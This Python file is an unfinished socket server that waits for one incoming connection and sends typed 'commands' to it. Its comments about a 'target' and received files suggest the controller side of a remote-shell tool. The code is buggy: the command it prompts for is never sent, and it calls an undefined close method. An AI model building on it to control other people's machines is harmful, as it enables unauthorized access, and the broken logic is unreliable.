import socket
# import sys
import os
import time


class Server:
    def __init__(self, ip, port, buffer_size):
        self.IP = ip
        self.PORT = port
        self.BACKUP_PORT = 8080
        self.BUFFER_SIZE = buffer_size

        self.connections = []  # connections list
        self.info = ""  # info about target
        # self.recvcounter = 0  # counter for received files

        self.server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    def startServer(self):
        self.server.bind((self.IP, self.PORT))
        self.server.listen(1)

        self.acceptConnections()

    def acceptConnections(self):
        print(self.IP)
        print("*** Listening for incoming connections ***")

        self.client_socket, self.address = self.server.accept()
        print(f"*** Connection from {self.address} has been established! ***")
        self.connections.append(self.client_socket)
        # print('here')
        self.commands()
        # print("hello worlds")
        # self.s

    def commands(self):

        while True:
            # get the command from prompt
            command = input("Enter the command you wanna execute:")
            # send the command to the client
            print(command)
            # self.client_socket.send(command.encode())
            if command.lower() == "exit":
                # if the command is exit, just break out of the loop
                break
            # retrieve command results
             # print("here2")
            msg = input("[+] Enter message: ")
            self.client_socket.send(msg.encode())
            print(msg)
            results = (self.client_socket.recv(self.BUFFER_SIZE).decode())
            # print them
            # print("goes wrong before here? ")
            print(results)
        # close connection to the client
        self.client_socket.close()
        # close server connection
        self.close()


def main():
    """ Creating the necessary dirs """

    try:
        os.mkdir('../receivedfile')
    except FileExistsError:
        pass

    # banner()
    time.sleep(1)

    HOSTNAME = socket.gethostname()
    IP = socket.gethostbyname(HOSTNAME)
    PORT = int(input("[+] Listen on port> "))
    BUFFERSIZE = 2048

    server = Server(IP, PORT, BUFFERSIZE)

    try:
        server.startServer()
    except Exception as e:
        print("*** Error while starting the server:", str(e) + " ***")
    # just sending a message, for demonstration purposes
    message = "Hello and Welcome".encode()
    # server.client_socket.send(message)


if __name__ == "__main__":
    main()
